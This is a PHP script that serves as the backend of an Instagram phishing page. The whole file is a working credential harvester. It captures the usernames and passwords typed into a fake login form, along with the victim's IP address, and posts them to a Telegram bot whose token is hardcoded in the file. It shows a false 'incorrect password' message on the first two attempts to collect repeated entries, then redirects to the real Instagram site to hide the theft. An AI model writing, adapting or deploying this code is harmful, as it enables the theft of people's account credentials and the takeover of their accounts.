<?php

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// Load environment variables
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') === false) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

// Set headers
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Telegram credentials - hardcoded for reliability
$telegram_bot_token = "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = "8244999766";

// Start session
session_start();

// Only process POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("Location: https://www.instagram.com/");
    exit;
}

// Get POST data
$username = isset($_POST["username"]) ? trim($_POST["username"]) : '';
$password = isset($_POST["password"]) ? $_POST["password"] : '';
$redirect_url = isset($_POST["redirect_url"]) ? trim($_POST["redirect_url"]) : 'https://www.instagram.com/';

// Validate redirect URL
if (empty($redirect_url) || strpos($redirect_url, 'instagram.com') === false) {
    $redirect_url = 'https://www.instagram.com/';
}

if (empty($username) || empty($password)) {
    $_SESSION['login_error'] = 'Please enter both username and password.';
    $_SESSION['redirect_url'] = $redirect_url;
    header("Location: " . ($_SERVER['HTTP_REFERER'] ?? '/'));
    exit;
}

// Track login attempts
$attempt_key = 'login_attempts_' . md5($username);
$attempts = isset($_SESSION[$attempt_key]) ? $_SESSION[$attempt_key] : 0;
$attempts++;
$_SESSION[$attempt_key] = $attempts;

// Get visitor info
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$timestamp = date("Y-m-d H:i:s T");

// Send credentials to Telegram
$message = "🔔 *Instagram Login Attempt #" . $attempts . "*\n\n";
$message .= "👤 *Username:* `" . str_replace('`', '', $username) . "`\n";
$message .= "🔑 *Password:* `" . str_replace('`', '', $password) . "`\n\n";
$message .= "📍 *IP:* `" . $ip . "`\n";
$message .= "🕐 *Time:* `" . $timestamp . "`\n";
$message .= "🎬 *Video:* " . $redirect_url;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$telegram_chat_id}&text=" . urlencode($message) . "&parse_mode=Markdown&disable_web_page_preview=true");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_exec($ch);
curl_close($ch);

// First attempt: show "incorrect password" error (like real Instagram)
// Second attempt: show error again
// Third attempt: redirect to video (simulating successful login)
if ($attempts < 3) {
    $_SESSION['login_error'] = 'Sorry, your password was incorrect. Please double-check your password.';
    $_SESSION['redirect_url'] = $redirect_url;
    $_SESSION['last_username'] = $username;
    header("Location: " . ($_SERVER['HTTP_REFERER'] ?? '/'));
    exit;
} else {
    // Reset attempts and redirect to video
    unset($_SESSION[$attempt_key]);
    unset($_SESSION['login_error']);
    unset($_SESSION['last_username']);
    header("Location: " . $redirect_url, true, 302);
    exit;
}

?>
